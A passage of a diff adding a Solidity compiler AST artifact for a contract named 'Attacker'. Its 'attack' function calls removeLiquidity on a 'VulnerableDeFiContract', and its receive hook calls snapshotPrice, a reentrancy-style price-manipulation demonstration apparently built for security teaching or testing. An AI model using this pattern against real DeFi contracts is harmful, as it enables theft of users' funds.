+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "removeLiquidity",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 31775,
+                      "src": "381:20:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                        "typeString": "function () external"
+                      }
+                    },
+                    "id": 31636,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "381:22:28",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 31637,
+                  "nodeType": "ExpressionStatement",
+                  "src": "381:22:28"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "308:6:28",
+            "parameters": {
+              "id": 31624,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "314:2:28"
+            },
+            "returnParameters": {
+              "id": 31625,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "326:0:28"
+            },
+            "scope": 31649,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 31648,
+            "nodeType": "FunctionDefinition",
+            "src": "416:64:28",
+            "nodes": [],
+            "body": {
+              "id": 31647,
+              "nodeType": "Block",
+              "src": "443:37:28",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "id": 31642,
+                        "name": "defi",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 31605,
+                        "src": "453:4:28",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                          "typeString": "contract VulnerableDeFiContract"
+                        }
+                      },
+                      "id": 31644,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "snapshotPrice",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 31682,
+                      "src": "453:18:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                        "typeString": "function () external"
+                      }
+                    },
+                    "id": 31645,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "453:20:28",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 31646,
+                  "nodeType": "ExpressionStatement",
+                  "src": "453:20:28"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "receive",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 31640,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "423:2:28"
+            },
+            "returnParameters": {
+              "id": 31641,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "443:0:28"
+            },
+            "scope": 31649,
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "Attacker",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          31649
+        ],
+        "name": "Attacker",
+        "nameLocation": "100:8:28",
+        "scope": 31650,
+        "usedErrors": []
+      }
+    ],
+    "license": "GPL-3.0"
+  },
+  "id": 28
+}
